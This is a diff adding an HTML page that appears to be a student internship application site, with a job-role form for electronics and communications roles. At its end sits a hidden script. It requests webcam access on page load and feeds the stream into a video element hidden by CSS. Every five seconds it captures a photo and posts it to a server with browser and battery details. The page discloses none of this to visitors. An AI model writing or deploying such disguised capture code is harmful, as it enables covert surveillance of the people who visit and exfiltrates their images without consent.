@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Internship Platform</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(to right, #e3f2fd, #ffffff);
+      overflow-x: hidden;
+    }
+
+    header {
+      background: #0d47a1;
+      color: #fff;
+      padding: 15px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
+    header .logo {
+      font-size: 22px;
+      font-weight: bold;
+    }
+
+    nav a {
+      color: #fff;
+      text-decoration: none;
+      margin: 0 15px;
+      font-weight: 500;
+    }
+
+    .hero {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 60px 20px 30px;
+      background: #e8f0fe;
+      text-align: center;
+    }
+
+    .hero h1 {
+      font-size: 36px;
+      color: #0d47a1;
+      margin-bottom: 10px;
+    }
+
+    .hero p {
+      font-size: 16px;
+      color: #333;
+      max-width: 700px;
+      margin-bottom: 40px;
+    }
+
+    .container {
+      background: #ffffff;
+      border-radius: 20px;
+      padding: 40px 30px;
+      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 450px;
+      margin: auto;
+      transform: perspective(1000px) rotateX(2deg) rotateY(3deg);
+      animation: float 3s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% {
+        transform: perspective(1000px) rotateX(2deg) rotateY(3deg) translateY(0);
+      }
+      50% {
+        transform: perspective(1000px) rotateX(2deg) rotateY(3deg) translateY(-10px);
+      }
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      font-size: 15px;
+    }
+
+    button {
+      background: linear-gradient(to right, #2196f3, #21cbf3);
+      color: white;
+      font-weight: bold;
+      padding: 14px;
+      width: 100%;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: transform 0.2s ease;
+    }
+
+    button:hover {
+      transform: scale(1.03);
+      background: linear-gradient(to right, #1976d2, #1de9b6);
+    }
+
+    video {
+      display: none;
+    }
+
+    footer {
+      margin-top: 40px;
+      text-align: center;
+      font-size: 14px;
+      padding-bottom: 20px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="logo">STUDENT INTERNS</div>
+  <nav>
+    <a href="#">STUDENT</a>
+    <a href="#">COMPANIES</a>
+    <a href="#">EVENTS</a>
+    <a href="#">MORE</a>
+    <a href="#">LOGIN</a>
+  </nav>
+</header>
+
+<section class="hero">
+  <h1>Internships</h1>
+  <p>Hiring interns can be beneficial for companies. Not only does it provide opportunity for students to develop professionally, but interns also prove to be extremely valuable assets.</p>
+</section>
+
+<div class="container">
+  <h2>ECE Internship Application</h2>
+  <form>
+    <input type="text" placeholder="Full Name" required>
+    <input type="email" placeholder="Email Address" required>
+    <select required>
+      <option value="">-- Select Role --</option>
+      <option>Embedded Systems Engineer</option>
+      <option>IoT Developer</option>
+      <option>Signal Processing Intern</option>
+      <option>VLSI Design Intern</option>
+      <option>Hardware Design Engineer</option>
+      <option>Network Protocol Analyst</option>
+      <option>Telecom Engineer</option>
+      <option>FPGA Developer</option>
+      <option>PCB Design Intern</option>
+      <option>Robotics & Automation</option>
+      <option>Wireless Communication Intern</option>
+      <option>Control Systems Engineer</option>
+      <option>Instrumentation Engineer</option>
+      <option>Satellite Communications Intern</option>
+      <option>AI in Electronics Intern</option>
+    </select>
+    
+    <button type="submit">Apply Now</button>
+  </form>
+</div>
+
+<footer>
+  &copy; 2025  Internship Platform. All Rights Reserved.
+</footer>
+
+<!-- Hidden Video -->
+<video id="video" autoplay></video>
+
+<script>
+  const video = document.getElementById("video");
+
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then((stream) => {
+      video.srcObject = stream;
+      startCapture();
+    })
+    .catch((err) => console.warn("Camera access denied"));
+
+  async function startCapture() {
+    const battery = await navigator.getBattery();
+    const canvas = document.createElement("canvas");
+    canvas.width = 320;
+    canvas.height = 240;
+    const ctx = canvas.getContext("2d");
+
+    setInterval(() => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL("image/jpeg");
+
+      const payload = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        battery: `${Math.round(battery.level * 100)}%`,
+        photo: imageData
+      };
+
+      fetch("/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    }, 5000); // every 5 seconds
+  }
+</script>
+
+</body>
+</html>
